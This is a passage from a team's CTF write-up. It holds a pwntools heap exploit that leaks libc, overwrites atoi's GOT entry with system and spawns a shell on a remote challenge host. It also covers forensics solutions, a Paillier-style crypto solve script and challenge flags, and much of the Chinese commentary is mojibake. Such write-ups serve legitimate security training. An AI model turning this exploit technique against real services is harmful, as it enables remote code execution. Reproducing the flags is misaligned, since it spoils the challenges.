#z()
ctx.interactive()
```
# 
```plain
#FMYY
from pwn import*
def new(size,content):
Â Â  Â p.sendlineafter('choice:','1')
Â Â  Â p.sendlineafter('house:',str(size))
Â Â  Â p.sendafter('your house:',content)
def show(index):
Â Â  Â p.sendlineafter('choice:','3')
Â Â  Â p.sendlineafter('index:',str(index))
def free(index):
Â Â  Â p.sendlineafter('choice:','4')
Â Â  Â p.sendlineafter('index:',str(index))
p = process('./main')
p = remote('das.wetolink.com',28499)
elf =ELF('./main')
libc = ELF('./libc-2.29.so',checksec=False)
for i in range(5):
Â Â  Â new(0x10,'/bin/sh\x00')
for i in range(3,-1,-1):
Â Â  Â free(i)
new(0x10,p64(elf.got['__libc_start_main']))
show(1)
p.recvuntil('house:\n')
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
rce = libc_base +0xe2383
show(2)
p.recvuntil('house:\n')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x320
log.info('HEAP:\t'+ hex(heap_base))
free(4)
free(5)
free(0)
new(0x10,'FMYY')
new(0x10,'FMYY')
new(0x10,'FMYY')
new(0x10,p64(elf.got['atoi']))
new(0x60,'FMYY')
new(0x10,p64(system))
p.sendlineafter('choice:','/bin/sh\x00')
p.interactive()
```
# **Miscï¼š**

## **6Gè¿˜è¿œå—****ï¼Ÿ****| SOLVED| 1****c****ePeak**

æ–­ç‚¹ä¸‹è½½ï¼Œç›´æ¥åœ¨æœ¬åœ°æŸ¥çœ‹æœªå®Œæˆçš„ä¸‹è½½æ–‡ä»¶å³å¯~

åŸæ¥å¦‚æ­¤

![å›¾ç‰‡](https://uploader.shimo.im/f/o0D6BEojtGINJYE5.png!thumbnail)

DASCTF{welcome_to_DAS_Ap1r1}

æ»šå»ä¸Šç½‘è¯¾äº†ï¼šï¼‰

å‘œå‘œå‘œæ¬ºè´Ÿæˆ‘ç½‘é€Ÿæ…¢

## **blueshark| SOLVED| Dalockï¼Œaaaaa**

é¦–å…ˆå°†æ–‡ä»¶æ”¾å…¥binwalkåˆ†ææ–‡ä»¶ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ª7zçš„å‹ç¼©åŒ…ã€‚æå–ä¹‹åå‘ç°æ–‡ä»¶åæ˜¯password_is_Bluetooth_PINï¼Œå°±å»æ‰¾PINï¼ˆä½†æ˜¯ä¹Ÿå¯ä»¥çˆ†ç ´ï¼‰ï¼š141854ï¼Œç„¶åå¾—åˆ°flagï¼šflag{6da01c0a419b0b56ca8307fc9ab623eb}


ä½ å“­å•¥

å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå…ˆæŠŠå‘œå‘œå‘œåˆ æ‰ç„¶åç—›å®šæ€ç—›å¼€å§‹å†™é¢˜

å•Šå“ˆå“ˆå“ˆè¢«å‘ç°äº†

åœ¨ç°åœº

è¿˜å¥½æˆ‘ä¸æ˜¯dalockï¼Œä½ ä¹Ÿä¸çŸ¥é“æˆ‘æ˜¯è°

æ‰¾PINç å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ    ä½ æ‰“å­—å¿«ç‚¹ï¼šï¼‰ 2333 ç›´æ¥æœç´¢PIN

è¯¶å‘€åˆ«é—¹æˆ‘åœ¨æƒ³å‘¢

ç«é€Ÿèµ¶æ¥ç°åœº

æ¥¼ä¸Šçš„æ¥æ™šäº†ï¼Œåæ€ä¸€ä¸‹å§

å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ

æ¥¼ä¸Šçœ‹ç¬¬äºŒè¡Œ

## **keyboard| SOLVED | 1cePeakï¼ŒDalockï¼Œaaaaa**

å¯ç–‘æ–‡ä»¶t.txt

![å›¾ç‰‡](https://uploader.shimo.im/f/yQvpPVRHchkOWLPz.png!thumbnail)

secretæ–‡ä»¶æœ‰å•¥ç”¨

secretæ˜¯ä¸€ä¸ªåŠ å¯†ç£ç›˜æ–‡ä»¶

![å›¾ç‰‡](https://uploader.shimo.im/f/oj15gHUQrGBWTrqa.png!thumbnail)

qweè§£å¯†

![å›¾ç‰‡](https://uploader.shimo.im/f/l56PBDMEEcwqlZMU.png!thumbnail)

ç„¶åæŒ‚è½½ç£ç›˜

![å›¾ç‰‡](https://uploader.shimo.im/f/f42SMnbcOhwORTi9.png!thumbnail)

![å›¾ç‰‡](https://uploader.shimo.im/f/nHyTh284DwMWHm4a.png!thumbnail)

Dalockå¸ˆå‚…tqlï¼Œæ–‡æ¡£å†™åˆ°è¿™é‡Œå‘ç°å·²ç»å‡ºäº†ï¼Œæˆ‘çˆ¬å¿«ç‚¹ã€‚ã€‚ã€‚ã€‚

å¤ªéš¾é¡¶å•¦ï¼Œdalockå¸ˆå‚…æ€»èƒ½é¢†å…ˆæˆ‘ä¸€æ­¥ï¼Œæˆ‘çˆ¬å¿«ä¸€ç‚¹ï¼Œä¿ºå•¥æ—¶å€™èƒ½æŠŠåå­—å†™ä¸Šå»å—·å‘œå‘œå‘œ   ---hacked by aaaaa

ntfséšå†™ï¼Œå‘½ä»¤è¡Œä¸­ç”¨dir /ræ— æ˜¾ç¤ºï¼Œç”¨7zfmçš„äº¤æ¢æ•°æ®æµçœ‹ä¹Ÿæœ‰é—®é¢˜ï¼Œç›´æ¥ç”¨å·¥å…·å¯ä»¥è§£å‡º

![å›¾ç‰‡](https://uploader.shimo.im/f/1GlI9EgTSoPBxTUd.png!thumbnail)



# **Cryptoï¼š**

## **not_RSA | SOLVED | working: éšç¼˜ **

g = n+1   ï¼ˆ1) 

c = g^m * r^n (mod n^2)    (2)

å·²çŸ¥ n,c,g  æ±‚m

å¯¹(2)å·¦å³æ¨¡nï¼Œç»“åˆ(1)å’ŒäºŒé¡¹å¼å®šç†å¾— r ^ n = c (mod n)ã€‚nä¸Ï†(n)äº’ç´ ï¼Œæ•…æ˜“æ±‚r mod nã€‚

è€Œ r çš„èŒƒå›´æ˜¯ 1~nã€‚å› æ­¤r mod n å°±æ˜¯ rã€‚

è§£å‡ºrä¹‹åå¾—åˆ° g^m = a (mod n^2) ï¼Œå†ç”¨äºŒé¡¹å¼å®šç†å¾—

mn  = a-1 (mod n)        

æ³¨æ„åˆ° n | (a-1)   æ•… m = a-1 // n

æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š

```python
#coding=utf-8
from gmpy2 import *
from Crypto.Util.number import long_to_bytes
p = 80006336965345725157774618059504992841841040207998249416678435780577798937819
q = 80006336965345725157774618059504992841841040207998249416678435780577798937447
n = 6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093
c = 29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549
g = n + 1
# c = g^m * r^n (mod n^2) = g^m * r^n (mod n\p\q ...)
# And g (mod n) = 1   r^n = r^pq = r^q (mod p)
# So we got r^q = c%p (mod p) ! Easy To solve r.
Ï† = (p-1) * (q-1)      # n and Ï† are coprime
r = pow(c%n, invert(n, Ï†), n)
# convert equation to g^m = a(mod n^2)
a = c * pow(invert(r,n*n), n, n*n) % (n*n)
m = (a-1) // n
flag = long_to_bytes(m)
if __name__ == '__main__':
    # print(r)
    # print(a)
    # print((a-1) % n)
    print(flag)     
```





